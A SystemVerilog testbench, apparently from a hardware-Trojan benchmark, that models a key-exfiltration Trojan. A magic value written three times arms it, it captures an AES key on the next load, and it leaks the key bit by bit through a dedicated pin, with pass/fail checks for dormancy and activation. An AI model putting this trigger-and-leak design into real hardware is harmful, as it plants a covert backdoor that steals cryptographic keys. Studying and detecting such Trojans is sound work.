`timescale 1ns/1ps

// Testbench for Trojan 6: AES Key Exfiltration
// Tests key leakage mechanism

module tb_aes_key_leak;

  logic clk, rst_n;
  logic trojan_active;
  logic leak_pin;
  logic test_passed;
  
  initial clk = 0;
  always #5 clk = ~clk;
  
  // Simplified key exfiltration Trojan
  logic [2:0] trigger_count;
  logic [31:0] control_reg_write;
  logic key_write;
  logic [255:0] captured_key;
  logic [8:0] bit_counter;
  logic [7:0] clock_div;
  
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trigger_count <= 3'h0;
      trojan_active <= 1'b0;
      bit_counter <= 9'h0;
      clock_div <= 8'h0;
      leak_pin <= 1'b0;
      captured_key <= 256'h0;
    end else begin
      // Trigger: 3 writes of 0xA5A5A5A5
      if (control_reg_write == 32'hA5A5_A5A5) begin
        if (trigger_count < 3'd3) trigger_count <= trigger_count + 1'b1;
      end
      
      // Capture key after trigger
      if (trigger_count == 3'd3 && key_write && !trojan_active) begin
        captured_key <= 256'hDEAD_BEEF_CAFE_BABE_0123_4567_89AB_CDEF;
        trojan_active <= 1'b1;
      end
      
      // Serial exfiltration
      if (trojan_active && bit_counter < 9'd256) begin
        if (clock_div == 8'd99) begin
          clock_div <= 8'h0;
          leak_pin <= captured_key[bit_counter[7:0]];
          bit_counter <= bit_counter + 1'b1;
        end else begin
          clock_div <= clock_div + 1'b1;
        end
      end
    end
  end
  
  initial begin
    $display("================================================================================");
    $display("Testbench: Trojan 6 - AES Key Exfiltration");
    $display("================================================================================\n");
    
    rst_n = 0;
    control_reg_write = 32'h0;
    key_write = 0;
    test_passed = 1'b1;
    #100;
    rst_n = 1;
    #50;
    
    $display("PHASE 1: Normal Operation");
    control_reg_write = 32'h0000_0001;
    key_write = 1;
    #20;
    key_write = 0;
    #500;
    if (trojan_active) begin
      $display("  [FAIL] Trojan active during normal operation");
      test_passed = 1'b0;
    end else begin
      $display("  [PASS] Trojan dormant without trigger sequence");
    end
    
    $display("\nPHASE 2: Trigger Sequence");
    $display("  Writing 0xA5A5A5A5 three times...");
    control_reg_write = 32'hA5A5_A5A5;
    #10; control_reg_write = 32'h0; #10;
    control_reg_write = 32'hA5A5_A5A5;
    #10; control_reg_write = 32'h0; #10;
    control_reg_write = 32'hA5A5_A5A5;
    #10; control_reg_write = 32'h0; #100;
    
    $display("  Loading key to trigger exfiltration...");
    key_write = 1;
    #20;
    key_write = 0;
    #100;
    
    if (!trojan_active) begin
      $display("  [FAIL] Trojan not activated");
      test_passed = 1'b0;
    end else begin
      $display("  [PASS] Trojan activated - key exfiltration started");
      $display("  [INFO] Key leaking at 1 bit per 100 cycles through leak_pin");
    end
    
    $display("\n%s\n", test_passed ? "ALL TESTS PASSED" : "SOME TESTS FAILED");
    $finish;
  end

endmodule

